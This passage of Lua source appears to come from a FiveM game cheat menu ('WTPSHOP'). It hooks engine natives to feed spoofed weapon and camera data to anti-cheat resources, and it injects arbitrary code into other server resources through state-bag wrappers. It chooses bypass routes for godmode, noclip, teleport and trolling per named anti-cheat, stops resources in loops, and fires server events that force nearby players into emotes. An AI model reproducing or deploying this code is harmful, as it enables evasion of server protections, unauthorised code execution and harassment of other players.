        if current.onSelect and type(current.onSelect) == "function" then
            if current.type == "scrollable-checkbox" then
                local ok, err = pcall(current.onSelect, current.values[current.value], current.checked)
                if not ok then self:Debug("red", "scrollable-checkbox onSelect error: " .. tostring(err)) end
            elseif current.type == "slider-checkbox" then
                local ok, err = pcall(current.onSelect, current.value, current.checked)
                if not ok then self:Debug("red", "slider-checkbox onSelect error: " .. tostring(err)) end
            else
                local ok, err = pcall(current.onSelect, current.checked)
                if not ok then self:Debug("red", "checkbox onSelect error: " .. tostring(err)) end
            end
        end

        self:NotifyFeatureUsed(current)
        self:UpdateElements(CurrentMenu)
        return
    end

    if current.type == "scrollable" or current.type == "scrollable-checkbox" then
        if current.values and type(current.values) == "table" and #current.values > 0 then
            if current.onSelect then
                local ok, err = pcall(current.onSelect, current.values[current.value])
                if not ok then self:Debug("red", "scrollable onSelect error: " .. tostring(err)) end
            end
            self:NotifyFeatureUsed(current)
        end

        return
    end

    if current.type == "slider" or current.type == "slider-checkbox" then
        if current.scrollType == "onEnter" and current.onSelect then
            if current.type == "slider-checkbox" then
                current.onSelect(current.value, current.checked or false)
            else
                current.onSelect(current.value)
            end
            self:NotifyFeatureUsed(current)
        end
        return
    end
end

function WTPSHOP:Backspace()
    if #MenuStack > 0 then
        local last = table.remove(MenuStack)
        table.remove(MenuLabelStack)
        CurrentMenu = last.menu or ActiveMenu
        CurrentCategories = last.categories
        CurrentCategoryIndex = last.categoryIndex or 1
        HoveredIndex = 1
        self:UpdateElements(CurrentMenu)
    else
        self:HideUI()
    end
end

function WTPSHOP:PrevCategory()
    if not CurrentCategories or #CurrentCategories == 0 then return end
    CurrentCategoryIndex = CurrentCategoryIndex - 1
    if CurrentCategoryIndex < 1 then CurrentCategoryIndex = #CurrentCategories end
    if CurrentCategories[CurrentCategoryIndex].label == "Triggers" then
        self:EnsureServerTriggers()
    end
    CurrentMenu = CurrentCategories[CurrentCategoryIndex].tabs or {}
    HoveredIndex = 1
    self:UpdateElements(CurrentMenu)
    self:SendMessage({ action = "keydown", index = HoveredIndex - 1 })
end

function WTPSHOP:NextCategory()
    if not CurrentCategories or #CurrentCategories == 0 then return end
    CurrentCategoryIndex = CurrentCategoryIndex + 1
    if CurrentCategoryIndex > #CurrentCategories then CurrentCategoryIndex = 1 end
    if CurrentCategories[CurrentCategoryIndex].label == "Triggers" then
        self:EnsureServerTriggers()
    end
    CurrentMenu = CurrentCategories[CurrentCategoryIndex].tabs or {}
    HoveredIndex = 1
    self:UpdateElements(CurrentMenu)
    self:SendMessage({ action = "keydown", index = HoveredIndex - 1 })
end

local setHooks = {}
local hookedNatives = {}
local safeLoadedScripts = {}

local function CreateHook(hookType, cb)
    setHooks[hookType] = cb
end

local function HookNative(setHash,  callback)
    hookedNatives[#hookedNatives + 1] = MachoHookNative(setHash, function(...)
        if GetCurrentResourceName() == 'lb-phone' or GetCurrentResourceName() == 'illenium-appearance' then
            return true
        end

        return callback(...)
    end)
end

HookNative(0x68EDDA28A5976D07, function()
    local resource = GetCurrentResourceName()
    return false, false
end)

HookNative(0xA571D46727E2B718, function(padIndex)
    if padIndex == 0 then
        local resource = GetCurrentResourceName()
        return false, false
    end

    return true
end)

HookNative(0x1CEA6BFDF248E5D9, function(padIndex, control)
    if control == 1 or control == 2 then
        local resource = GetCurrentResourceName()
        return false, true
    end

    return true
end)

HookNative(0xB15162CB5826E9E8, function() return false, true end) -- IsCinematicCamRendering
HookNative(0xD9D2CFFF49FAB35F, function() return false, true end) -- IsPlayerSwitchInProgress
HookNative(0x036F97C908C2B52C, function() return false, true end) -- IsCamInterpolating
HookNative(0xF5F1E89A970B7796, function() return false, true end) -- IsCinematicCamInputActive
HookNative(0xCA9D2AA3E326D720, function() return false, true end) -- IsCinematicIdleCamRendering
HookNative(0x19CAFA3C87F7C2FF, function() return false, 3 end) -- GetCamActiveViewModeContext

HookNative(0x0C515FAB3FF9EA92, function(propType, data)
    if menuInjected and propType and data then
        if propType == 'SetClient_LoadedSafeFuncs' then
            safeLoadedScripts[data] = true
        elseif propType == 'WTPSHOP.Hook' then
            data = json.decode(data)
            
            if data then
                local hookData = data.HookData

                if hookData then
                    local setHook = setHooks[hookData.HookType]

                    if setHook then
                        CreateThread(function()
                            setHook(table.unpack(hookData.SetArgs))
                        end)
                    end
                end
            end
        end
    end

    return true
end)

HookNative(0x0A6DB4965674D243, function(ped)
    if not WTPSHOP.SpoofWeaponActive then
        return true
    end
    if ped ~= PlayerPedId() then
        return true
    end
    if not ApiRasclat.IsAnticheatResource(GetCurrentResourceName()) then
        return true
    end
    return false, WTPSHOP.AcMaskWeaponHash
end)

HookNative(0x3BE0BB4D53992200, function(ped, unused)
    if not WTPSHOP.SpoofWeaponActive then
        return true
    end
    if ped ~= PlayerPedId() then
        return true
    end
    if not ApiRasclat.IsAnticheatResource(GetCurrentResourceName()) then
        return true
    end
    return false, true, WTPSHOP.AcMaskWeaponHash
end)

HookNative(0x8DECB02F88CB428E, function(ped, weaponHash)
    if not WTPSHOP.SpoofWeaponActive then
        return true
    end
    if ped ~= PlayerPedId() then
        return true
    end
    if not ApiRasclat.IsAnticheatResource(GetCurrentResourceName()) then
        return true
    end
    if weaponHash == WTPSHOP.HandWeaponHash then
        return false, false
    end
    if weaponHash == WTPSHOP.AcMaskWeaponHash or weaponHash == GetHashKey("WEAPON_UNARMED") then
        return false, true
    end
    return false, false
end)

HookNative(0x015A522136D7F951, function(ped, weaponHash)
    if ped ~= PlayerPedId() then
        return true
    end
    if not ApiRasclat.IsAnticheatResource(GetCurrentResourceName()) then
        return true
    end
    if WTPSHOP.SpoofWeaponActive and weaponHash == WTPSHOP.HandWeaponHash then
        return false, 0
    end
    if WTPSHOP.InfiniteAmmoStealth then
        return false, 48
    end
    return true
end)

local stoppedResources = {}
local MainAPI = {}
MainAPI.StopResource = function(resource)
    stoppedResources[resource] = true
    MachoResourceStop(resource)
    
    MainAPI.Debug('Stopped resource', resource)
end

MainAPI.StartResource = function(resource)
    stoppedResources[resource] = nil
    MachoResourceStart(resource)
    
    MainAPI.Debug('Started resource', resource)
end

MainAPI.ResourceLoop = function(resource, pattern, w1, w2)
    CreateThread(function()
        while true do
            if pattern == "stop" then
                MachoResourceStop(resource)
                Wait(w1)

            elseif pattern == "stop_start" then
                MachoResourceStop(resource)
                Wait(w1)

                MachoResourceStart(resource)
                Wait(w2)

            else
                MachoResourceStart(resource)
                Wait(w1)

                MachoResourceStop(resource)
                Wait(w2)
            end
        end
    end)
end

local EXECUTE_RYBAN_PREFIX = [[
            local WTPSHOP = {}
            WTPSHOP.SafeRunNative = function(setFunc, ...)
                return setFunc(...)
            end
            WTPSHOP.Native = WTPSHOP.SafeRunNative
            WTPSHOP.Thread = CreateThread
            WTPSHOP.Wait = Wait

]]

local EXECUTE_INJECT_WRAPPER = [[
		local WTPSHOP = {}

		WTPSHOP.RunId = 'RUN_ID'

		WTPSHOP.StringFind = string.find
		WTPSHOP.StringChar = string.char
		WTPSHOP.StringLower = string.lower
		WTPSHOP.TableUnpack = table.unpack

		WTPSHOP.EXT_FUNCREF = 10

		WTPSHOP.PackValueExt = function(tag, data)
			local len = #data

			if len == 1 then
				return WTPSHOP.StringChar(0xD4, tag)..data
			elseif len == 2 then
				return WTPSHOP.StringChar(0xD5, tag)..data
			elseif len == 4 then
				return WTPSHOP.StringChar(0xD6, tag)..data
			elseif len == 8 then
				return WTPSHOP.StringChar(0xD7, tag)..data
			elseif len == 16 then
				return WTPSHOP.StringChar(0xD8, tag)..data
			elseif len <= 255 then
				return WTPSHOP.StringChar(0xC7, len, tag)..data
			elseif len <= 65535 then
				return WTPSHOP.StringChar(0xC8, math.floor(len / 256), len % 256, tag)..data
			end
		end

		WTPSHOP.PackValue = function(val)
			local t = val ~= nil and type(val)

			if val == nil then
				return WTPSHOP.StringChar(0xC0)
			elseif t == 'boolean' then
				return WTPSHOP.StringChar(val and 0xC3 or 0xC2)
			elseif t == 'number' then
				if val % 1 == 0 then
					if val >= 0 and val <= 127 then
						return WTPSHOP.StringChar(val)
					elseif val < 0 and val >= -32 then
						return WTPSHOP.StringChar(0x100 + val)
					elseif val >= 0 and val <= 0xFF then
						return WTPSHOP.StringChar(0xCC, val)
					elseif val >= 0 and val <= 0xFFFF then
						return WTPSHOP.StringChar(0xCD, math.floor(val / 256), val % 256)
					elseif val >= -128 and val < 0 then
						return WTPSHOP.StringChar(0xD0, 0x100 + val)
					elseif val >= -32768 and val < 0 then
						local v = 0x10000 + val
						return WTPSHOP.StringChar(0xD1, math.floor(v / 256), v % 256)
					end
				end

				local buf = string.pack('>d', val)

				return WTPSHOP.StringChar(0xCB) .. buf
			elseif t == 'string' then
				local len = #val

				if len <= 31 then
					return WTPSHOP.StringChar(0xA0 + len) .. val
				elseif len <= 255 then
					return WTPSHOP.StringChar(0xD9, len) .. val
				elseif len <= 65535 then
					return WTPSHOP.StringChar(0xDA, math.floor(len / 256), len % 256) .. val
				end
			elseif t == 'function' then
				local ref = Citizen.GetFunctionReference(val)

				if ref then
					return WTPSHOP.PackValueExt(WTPSHOP.EXT_FUNCREF, ref)
				else
					error('Cannot pack non-referenced function')
				end
			elseif t == 'table' then
				local cfxRef = rawget(val, '__cfx_functionReference')
				if cfxRef then
					local ref = Citizen.GetFunctionReference(val)
					if ref then
						return WTPSHOP.PackValueExt(WTPSHOP.EXT_FUNCREF, ref)
					end
				end

				local n = #val
				local header

				if n <= 15 then
					header = WTPSHOP.StringChar(0x90 + n)
				elseif n <= 65535 then
					header = WTPSHOP.StringChar(0xDC, math.floor(n / 256), n % 256)
				end

				local parts = {
					header
				}

				for i = 1, n do
					parts[#parts + 1] = WTPSHOP.PackValue(val[i])
				end

				return table.concat(parts)
			end
		end

		WTPSHOP.RawSafeRunNative = function(native, ...)
			local funcRef = msgpack.unpack(WTPSHOP.PackValue(native))

			return funcRef(...)
		end

		WTPSHOP.SetSafeStateBag = function(bag, key, value, synced)
			if value == nil then
				return
			end

			local payload = WTPSHOP.PackValue(value)
			if payload == nil then
				return
			end

			WTPSHOP.RawSafeRunNative(SetStateBagValue, bag, key, payload, #payload, synced)
		end

		WTPSHOP.SetSafeLocalState = function(key, value, synced)
			return WTPSHOP.SetSafeStateBag('player:'..GetPlayerServerId(PlayerId()), key, value, synced or false)
		end

		WTPSHOP.CachedSafeFuncs = {}

		WTPSHOP.GetSafeFunc = function(func)
			local safeFunc = WTPSHOP.CachedSafeFuncs[func]

			if safeFunc then
				return safeFunc
			end

			local serverId = GetPlayerServerId(PlayerId())
			local bag = 'player:'..serverId
			local key = '__cfx_stateBag::'..WTPSHOP.RunId..'::'..math.random(999999)..'::'..GetGameTimer()

			WTPSHOP.SetSafeStateBag(bag, key, func, false)

			safeFunc = Player(serverId).state[key]
			WTPSHOP.CachedSafeFuncs[func] = safeFunc

			return safeFunc
		end

		WTPSHOP.SafeRunNative = function(setNative, ...)
			local safeFunc = WTPSHOP.GetSafeFunc(setNative)

			return safeFunc(...)
		end

		WTPSHOP.Native = WTPSHOP.SafeRunNative
		WTPSHOP.Thread = function(fn)
			return WTPSHOP.Native(CreateThread, fn)
		end
		WTPSHOP.Wait = function(ms)
			return WTPSHOP.Native(Wait, ms)
		end

		WTPSHOP.SafeCall = function(cb, ...)
			local callArgs = {...}
			local createThread = WTPSHOP.GetSafeFunc(Citizen.CreateThreadNow)
			local safeCb = WTPSHOP.GetSafeFunc(cb)

			createThread(function()
				safeCb(WTPSHOP.TableUnpack(callArgs))
			end)
		end

		WTPSHOP.DeleteTrackedThread = function(threadName)
			if _G.SetClient_TrackedSafeThreads then
				local setThreadCb = _G.SetClient_TrackedSafeThreads[threadName]

				if setThreadCb then
					setThreadCb()
				end
			end
		end

		WTPSHOP.DeleteAllTrackedThreads = function()
			if _G.SetClient_TrackedSafeThreads then
				local setTrackedThreads = {}
				
				for threadName, setThreadCb in pairs(_G.SetClient_TrackedSafeThreads) do
					if setThreadCb then
						setTrackedThreads[#setTrackedThreads + 1] = setThreadCb
					end
				end

				_G.SetClient_TrackedSafeThreads = nil
				
				for i = 1, #setTrackedThreads do
					WTPSHOP.SafeCall(setTrackedThreads[i])
				end
			end
		end

		WTPSHOP.CreateTrackedThread = function(threadName, setHandlers)
			WTPSHOP.DeleteTrackedThread(threadName)

			WTPSHOP.SafeCall(function()
				setHandlers.isActive = true

				_G.SetClient_TrackedSafeThreads = _G.SetClient_TrackedSafeThreads or {}

				_G.SetClient_TrackedSafeThreads[threadName] = function()
					setHandlers.isActive = false

					if _G.SetClient_TrackedSafeThreads then
						_G.SetClient_TrackedSafeThreads[threadName] = nil
					end

					if setHandlers.onRemove then
						setHandlers:onRemove()
					end
				end

				setHandlers:thread()
			end)
		end

		WTPSHOP.GetEntityParent = function(entity)
			local selfPed = entity or PlayerPedId()
			local selfVehicle = GetVehiclePedIsIn(selfPed, false)
			local selfEntity = selfPed

			if selfVehicle and selfVehicle > 0 and selfPed == GetPedInVehicleSeat(selfVehicle, -1) then
				selfEntity = selfVehicle
			end

			return selfEntity
		end

		WTPSHOP.SafeWrapValue = function(setVal)
			return function(...)
				local Promise = promise.new()
				local setArgs = {...}
			
				WTPSHOP.SafeCall(function()
					Promise:resolve(setVal(WTPSHOP.TableUnpack(setArgs)))
				end)

				return Citizen.Await(Promise)
			end
		end

		local AreStringsEqual = WTPSHOP.SafeWrapValue(AreStringsEqual)

		WTPSHOP.GetSafeArgs = function(setArgs)
			for setKey, setValue in pairs(setArgs) do
				local setType = type(setValue)

				if setType == 'function' then
					setValue = tostring(setValue)
				elseif setType == 'table' then
					setValue = WTPSHOP.GetSafeArgs(setValue)
				end

				setArgs[setKey] = setValue
			end

			return setArgs
		end

		WTPSHOP.SendToHook = function(hookType, ...)
			WTPSHOP.Native(AreStringsEqual, 'WTPSHOP.Hook', json.encode({
				HookData = {
					HookType = hookType,
					SetArgs = WTPSHOP.GetSafeArgs({...})
				}
			}))
		end

]]

function WTPSHOP:SoftEnsureBypass()
    if #detectedAC == 0 and not resolveFiveGuardClientResource() then
        return true
    end
    if allAcBypassesSatisfied() then
        return true
    end
    ensureAllAcBypasses(true, false)
    return allAcBypassesSatisfied()
end

local function injectCode(resource, code)
    resource = ApiRasclat.NormalizeResource(resource)
    if GetResourceState("rryban_secure") == "started" then
        return AyokongInjectionman(resource, EXECUTE_RYBAN_PREFIX .. code)
    end
    local runId = tostring(math.random(999999)) .. "-" .. tostring(GetGameTimer())
    return AyokongInjectionman(resource, EXECUTE_INJECT_WRAPPER:gsub("RUN_ID", runId) .. code)
end

local function executeCode(resource, code, routeFeature)
    if not WTPSHOP:GuardInject("Inject") then
        return false
    end
    WTPSHOP:SoftEnsureBypass()
    resource = ApiRasclat.NormalizeResource(resource)
    if resource == "any" then
        return ApiRasclat.RouteFeature(routeFeature or "misc", code)
    end
    return injectCode(resource, code)
end

local function featureExecute(feature, code)
    return ApiRasclat.RouteFeature(feature, code)
end

local SCULLY_DANCE_SCAN_CACHE = {}

local function scullyCacheKey(label, command)
    return (label or command or "?") .. "|" .. (command or "")
end

local function mergeScullyDanceEntry(entry, tag)
    if not entry or not entry.Command then return end
    local label = entry.Label or entry.Command
    local key = scullyCacheKey(label, entry.Command)
    if SCULLY_FORCE_DANCE_MAP[label] or SCULLY_DANCE_SCAN_CACHE[key] then return end
    SCULLY_DANCE_SCAN_CACHE[key] = {
        Label = label,
        Command = entry.Command,
        Dictionary = entry.Dictionary or "missfbi3",
        Animation = entry.Animation or "idle",
        OtherEmote = entry.Other or entry.OtherEmote or entry.Command,
        _tag = tag,
    }
end

local function mergeScullyDanceCacheFromFiles()
    local res = "scully_emotemenu"
    if GetResourceState(res) ~= "started" then return 0 end
    local files = {
        { path = "shared/data/emotes/dance_emotes.lua", tag = "DANCE" },
        { path = "shared/data/emotes/synchronized_dance_emotes.lua", tag = "SYNC_DANCE" },
    }
    local added = 0
    for _, f in ipairs(files) do
        local content = LoadResourceFile(res, f.path)
        if content and #content > 0 then
            local cur = {}
            local function flush()
                if cur.Command then
                    local before = 0
                    for _ in pairs(SCULLY_DANCE_SCAN_CACHE) do before = before + 1 end
                    mergeScullyDanceEntry(cur, f.tag)
                    local after = 0
                    for _ in pairs(SCULLY_DANCE_SCAN_CACHE) do after = after + 1 end
                    if after > before then added = added + 1 end
                end
                cur = {}
            end
            for line in content:gmatch("[^\r\n]+") do
                local cmd = line:match("Command%s*=%s*['\"]([^'\"]+)['\"]")
                if cmd then cur.Command = cmd end
                local label = line:match("Label%s*=%s*['\"]([^'\"]+)['\"]")
                if label then cur.Label = label end
                local dict = line:match("Dictionary%s*=%s*['\"]([^'\"]+)['\"]")
                if dict then cur.Dictionary = dict end
                local anim = line:match("Animation%s*=%s*['\"]([^'\"]+)['\"]")
                if anim then cur.Animation = anim end
                local other = line:match("OtherEmote%s*=%s*['\"]([^'\"]+)['\"]")
                    or line:match("OtherAnimation%s*=%s*['\"]([^'\"]+)['\"]")
                if other then cur.Other = other end
                if line:match("^%s*}%s*,?%s*$") then flush() end
            end
            flush()
        end
    end
    return added
end

local function getScullyForceDanceScrollLabels()
    local labels, seen = {}, {}
    for label in pairs(SCULLY_FORCE_DANCE_MAP) do
        if not seen[label] then
            seen[label] = true
            labels[#labels + 1] = label
        end
    end
    for _, entry in pairs(SCULLY_DANCE_SCAN_CACHE) do
        local label = entry.Label
        if label and not seen[label] then
            seen[label] = true
            labels[#labels + 1] = label
        end
    end
    table.sort(labels)
    return labels
end

local function getScullyForceDanceEntry(label)
    if SCULLY_FORCE_DANCE_MAP[label] then
        return SCULLY_FORCE_DANCE_MAP[label]
    end
    for _, entry in pairs(SCULLY_DANCE_SCAN_CACHE) do
        if entry.Label == label then
            return entry
        end
    end
    return nil
end

local function getScullyBuiltinDanceLabels()
    local labels = {}
    for label in pairs(SCULLY_FORCE_DANCE_MAP) do
        labels[#labels + 1] = label
    end
    table.sort(labels)
    return labels
end

local function refreshScullyForceDanceMenuValues()
    local labels = getScullyForceDanceScrollLabels()
    if #labels == 0 then
        labels = getScullyBuiltinDanceLabels()
    end
    for _, menu in ipairs(ActiveMenu) do
        if menu.label == "Server Options" and menu.categories then
            for _, cat in ipairs(menu.categories) do
                if cat.label == "Triggers" and cat.tabs then
                    for _, tab in ipairs(cat.tabs) do
                        if tab.label == "Force Dance (All)" and tab.values then
                            tab.values = labels
                            if tab.value and tab.value > #labels then
                                tab.value = 1
                            end
                            if CurrentMenu == cat.tabs or (CurrentCategories and CurrentCategories[CurrentCategoryIndex] == cat) then
                                WTPSHOP:UpdateElements(CurrentMenu)
                            end
                            return #labels
                        end
                    end
                end
            end
        end
    end
    return #labels
end

local SCULLY_FORCE_DANCE_MAP = {
    ["Khumgame Loop"] = {
        Label = "Khumgame Loop", Command = "oudoudkhumgameloop",
        Dictionary = "oudoud@khumgame_loop", Animation = "oudoud_khumgame_loop", OtherEmote = "oudoudkhumgameloop"
    },
    ["Muaydance"] = {
        Label = "Muaydance", Command = "oudoudmuaydance",
        Dictionary = "oudoud@muaydance", Animation = "oudoud_muaydance", OtherEmote = "oudoudmuaydance"
    },
    ["Silhouette Couple Right"] = {
        Label = "Silhouette Couple Right", Command = "jarpsilhouettecoupleright",
        Dictionary = "jarp_silhouette_couple_right", Animation = "jarp_silhouette_couple_right_clip", OtherEmote = "jarpsilhouettecoupleright"
    },
    ["Yuayuabodbod - Loop 3"] = {
        Label = "Yuayuabodbod - Loop 3", Command = "yuayuabodbodloop3",
        Dictionary = "oudoud@yuayuabodbod", Animation = "oudoud_yuayuabodbod_3", OtherEmote = "yuayuabodbodloop3"
    },
    ["Yuayuabodbod - Loop 4"] = {
        Label = "Yuayuabodbod - Loop 4", Command = "yuayuabodbodloop4",
        Dictionary = "oudoud@yuayuabodbod", Animation = "oudoud_yuayuabodbod_4", OtherEmote = "yuayuabodbodloop4"
    },
    ["Pata Pata 2"] = {
        Label = "Pata Pata 2", Command = "patapata2",
        Dictionary = "patapata2@animation", Animation = "patapata2_clip", OtherEmote = "patapata2"
    },
    ["Scuba Dance Trend"] = {
        Label = "Scuba Dance Trend", Command = "scubascuba",
        Dictionary = "scubascuba@animation", Animation = "scubascuba_clip", OtherEmote = "scubascuba"
    },
}

local function scullyEmoteInjectArgs(d)
    return d.Label, d.Command, d.Dictionary, d.Animation, d.OtherEmote,
        d.Command, d.Dictionary, d.Animation, d.OtherEmote
end

local function buildScullySyncNearbyInject(d)
    return string.format([[
        local maxDistance = 15.0
        local myCoords = GetEntityCoords(PlayerPedId())
        local activePlayers = GetActivePlayers()
        local danceData = {
            Label = %q, Command = %q, Dictionary = %q, Animation = %q,
            Synchronized = true,
            Options = { Flags = { Loop = true }, Shared = { OtherEmote = %q } }
        }
        local otherEmoteData = {
            Label = "Synchronized Dance", Command = %q, Dictionary = %q, Animation = %q,
            Synchronized = true,
            Options = { Flags = { Loop = true }, Shared = { OtherEmote = %q } }
        }
        for i = 1, #activePlayers do
            local targetPlayer = activePlayers[i]
            if targetPlayer ~= PlayerId() then
                local targetPed = GetPlayerPed(targetPlayer)
                if DoesEntityExist(targetPed) then
                    local targetCoords = GetEntityCoords(targetPed)
                    if #(myCoords - targetCoords) <= maxDistance then
                        local targetServerId = GetPlayerServerId(targetPlayer)
                        WTPSHOP.Native(TriggerServerEvent, 'scully_emotemenu:requestSynchronizedEmote', targetServerId, danceData, otherEmoteData)
                        WTPSHOP.Native(TriggerServerEvent, 'scully_emotemenu:synchronizedEmoteResponse', targetServerId, danceData, otherEmoteData)
                    end
                end
            end
        end
    ]], scullyEmoteInjectArgs(d))
end

local function buildScullySyncTargetInject(targetPlayerIndex, d)
    return string.format([[
        local maxDistance = 15.0
        local myCoords = GetEntityCoords(PlayerPedId())
        local danceData = {
            Label = %q, Command = %q, Dictionary = %q, Animation = %q,
            Synchronized = true,
            Options = { Flags = { Loop = true }, Shared = { OtherEmote = %q } }
        }
        local otherEmoteData = {
            Label = "Synchronized Dance", Command = %q, Dictionary = %q, Animation = %q,
            Synchronized = true,
            Options = { Flags = { Loop = true }, Shared = { OtherEmote = %q } }
        }
        local targetPlayer = %d
        local targetPed = GetPlayerPed(targetPlayer)
        if DoesEntityExist(targetPed) then
            local targetCoords = GetEntityCoords(targetPed)
            if #(myCoords - targetCoords) <= maxDistance then
                local targetServerId = GetPlayerServerId(targetPlayer)
                WTPSHOP.Native(TriggerServerEvent, 'scully_emotemenu:requestSynchronizedEmote', targetServerId, danceData, otherEmoteData)
                WTPSHOP.Native(TriggerServerEvent, 'scully_emotemenu:synchronizedEmoteResponse', targetServerId, danceData, otherEmoteData)
            end
        end
    ]], scullyEmoteInjectArgs(d), targetPlayerIndex)
end

local function scanScullyEmotesFromFiles()
    local res = "scully_emotemenu"
    local files = {
        { path = "shared/data/emotes/dance_emotes.lua", tag = "DANCE" },
        { path = "shared/data/emotes/synchronized_emotes.lua", tag = "SHARED" },
        { path = "shared/data/emotes/synchronized_dance_emotes.lua", tag = "SYNC_DANCE" },
    }
    print("^3[WTPSHOP Scully]^7 ===== File scan (server pack data) =====")
    local total = 0
    for _, f in ipairs(files) do
        local content = LoadResourceFile(res, f.path)
        if content and #content > 0 then
            local cur = {}
            local function flush()
                if cur.Command then
                    total = total + 1
                    print(string.format("^3[WTPSHOP Scully]^7 %s | %s | cmd=%s | dict=%s | anim=%s | other=%s",
                        f.tag, cur.Label or "?", cur.Command, cur.Dictionary or "-", cur.Animation or "-",
                        cur.Other or "-"))
                end
                cur = {}
            end
            for line in content:gmatch("[^\r\n]+") do
                local cmd = line:match("Command%s*=%s*['\"]([^'\"]+)['\"]")
                if cmd then cur.Command = cmd end
                local label = line:match("Label%s*=%s*['\"]([^'\"]+)['\"]")
                if label then cur.Label = label end
                local dict = line:match("Dictionary%s*=%s*['\"]([^'\"]+)['\"]")
                if dict then cur.Dictionary = dict end
                local anim = line:match("Animation%s*=%s*['\"]([^'\"]+)['\"]")
                if anim then cur.Animation = anim end
                local other = line:match("OtherEmote%s*=%s*['\"]([^'\"]+)['\"]")
                    or line:match("OtherAnimation%s*=%s*['\"]([^'\"]+)['\"]")
                if other then cur.Other = other end
                if line:match("^%s*}%s*,?%s*$") then
                    flush()
                end
            end
            flush()
        else
            print("^1[WTPSHOP Scully]^7 Missing or empty: " .. f.path)
        end
    end
    print(string.format("^3[WTPSHOP Scully]^7 File scan entries: %d", total))
    return total > 0
end

local function scanScullyEmotesToF8()
    if GetResourceState("scully_emotemenu") ~= "started" then
        print("^1[WTPSHOP Scully]^7 scully_emotemenu is not started.")
        return false
    end

    local added = mergeScullyDanceCacheFromFiles()
    if added > 0 then
        print("^3[WTPSHOP Scully]^7 Merged " .. added .. " dance(s) into Force Dance list.")
    end

    executeCode("scully_emotemenu", [[
        local function sharedOther(e)
            if not e or not e.Options or not e.Options.Shared then return nil end
            local s = e.Options.Shared
            return s.OtherEmote or s.OtherAnimation
        end
        local function catIsDance(cat)
            if type(cat) ~= "table" then return false end
            local n = cat.name or cat.Name or ""
            return string.lower(tostring(n)):find("dance", 1, true) ~= nil
        end
        local function logLine(prefix, catName, e, extra)
            print(string.format("^3[WTPSHOP Scully]^7 %s | [%s] %s | cmd=%s | dict=%s | anim=%s%s",
                prefix, catName, e.Label or "?", e.Command or "?",
                e.Dictionary or "-", e.Animation or "-", extra or ""))
        end

        if type(Emotes) ~= "table" then
            print("^1[WTPSHOP Scully]^7 Emotes table missing — try again after emote menu loads.")
            return
        end

        print("^3[WTPSHOP Scully]^7 ===== Live scan (Dance categories + Shared/Sync) =====")
        local dances, shared = 0, 0
        local seenShared = {}

        for ci = 1, #Emotes do
            local cat = Emotes[ci]
            local catName = (type(cat) == "table" and cat.name) or ("cat" .. ci)
            local opts = (type(cat) == "table" and cat.options) or cat
            if type(opts) == "table" then
                local danceCategory = catIsDance(cat)
                for oi = 1, #opts do
                    local e = opts[oi]
                    if type(e) == "table" and e.Command then
                        local other = sharedOther(e)
                        local sync = e.Synchronized == true
                        if danceCategory then
                            dances = dances + 1
                            logLine("^5DANCE", catName, e, other and (" | other=" .. other) or "")
                        end
                        if sync or other then
                            local key = (e.Command or "") .. "|" .. (other or "")
                            if not seenShared[key] then
                                seenShared[key] = true
                                shared = shared + 1
                                logLine("^2SHARED", catName, e,
                                    (" | sync=" .. tostring(sync)) .. (other and (" | other=" .. other) or ""))
                            end
                        end
                    end
                end
            end
        end

        print(string.format("^3[WTPSHOP Scully]^7 Live totals: %d dance-category, %d shared/sync (deduped).", dances, shared))
    ]])

    scanScullyEmotesFromFiles()
    return true
end

local AC_ROUTING = {
    noclip = "monitor",
    teleport = "monitor",
    txadmin = "monitor",
    freecam = "saferes",
    troll = "saferes",
    triggers = "saferes",
    weapons = "saferes",
    godmode = "saferes",
    invisibility = "saferes",
    self = "saferes",
    revive = "saferes",
    online = "saferes",
    vehicle = "pool",
    misc = "pool",
    vynx = "raw",
    waveshield = "pool",
    default = "pool",
}

function ApiRasclat.ResolveRoute(feature)
    local route = AC_ROUTING[feature] or AC_ROUTING.default
    if feature == "misc" then
        if ACExceptionsType["PraryoAC"] or ACExceptionsType["FGAC"]
            or ACExceptionsType["RybanAC"] or ACExceptionsType["ElectronAC"] then
            return "saferes"
        end
    end
    if ACExceptionsType["LeakDawAC"] then
        return "raw"
    end
    if ACExceptionsType["PraryoAC"] then
        if feature == "godmode" or feature == "invisibility" or feature == "weapons"
            or feature == "self" or feature == "revive" or feature == "freecam" or feature == "troll" then
            return "saferes"
        end
    end
    if ACExceptionsType["FGAC"] then
        if feature == "noclip" or feature == "teleport" or feature == "txadmin" then
            return "monitor"
        end
        if feature == "godmode" or feature == "invisibility" or feature == "freecam" or feature == "self"
            or feature == "weapons" or feature == "revive" or feature == "vehicle" then
            return "saferes"
        end
    end
    if ACExceptionsType["RybanAC"] then
        if feature == "godmode" or feature == "invisibility" or feature == "weapons" or feature == "self"
            or feature == "noclip" or feature == "freecam" or feature == "revive" or feature == "vehicle" then
            return "saferes"
        end
    end
    if ACExceptionsType["ElectronAC"] then
        if feature == "godmode" or feature == "invisibility" or feature == "self" or feature == "weapons"
            or feature == "noclip" or feature == "teleport" or feature == "revive" or feature == "vehicle" then
            return "saferes"
        end
    end
    if ACExceptionsType["WS"] then
        if feature == "godmode" or feature == "waveshield" or feature == "vehicle" then
            return "waveshield"
        end
    end
    return route
end

function ApiRasclat.RouteFeature(feature, code, rawPreferredResource)
    WTPSHOP:SoftEnsureBypass()
    local route = ApiRasclat.ResolveRoute(feature)
    if route == "monitor" then
        return ApiRasclat.Monitor(code)
    elseif route == "saferes" then
        return ApiRasclat.SafeRes(code)
    elseif route == "raw" then
        return ApiRasclat.InjectRaw(rawPreferredResource or "any", code)
    elseif route == "waveshield" and GetResourceState("WaveShield") == "started" then
        return injectCode("WaveShield", code)
    end
    return injectCode("any", code)
end

function ApiRasclat.ExecuteFeature(feature, code, rawPreferredResource)
    return ApiRasclat.RouteFeature(feature, code, rawPreferredResource)
end

function ApiRasclat.Monitor(code)
    return executeCode("monitor", code)
end

local function refreshTargetSafeRes()
    if ACExceptionsType["PraryoAC"] or GetResourceState("cfx-praryo-kernel") == "started" then
        if GetResourceState("ox_inventory") == "started" then
            targetSafeRes = "ox_inventory"
            return
        end
        if GetResourceState("cfx-praryo-groups") == "started" then
            targetSafeRes = "cfx-praryo-groups"
            return
        end
    end
    targetSafeRes = (GetResourceState("es_extended") == "started" and "es_extended")
        or (GetResourceState("ox_lib") == "started" and "ox_lib")
        or "any"
end

function ApiRasclat.SafeRes(code)
    refreshTargetSafeRes()
    return executeCode(targetSafeRes, code)
end

function ApiRasclat.Freecam(code)
    return ApiRasclat.SafeRes(code)
end

function ApiRasclat.Pool(code)
    WTPSHOP:SoftEnsureBypass()
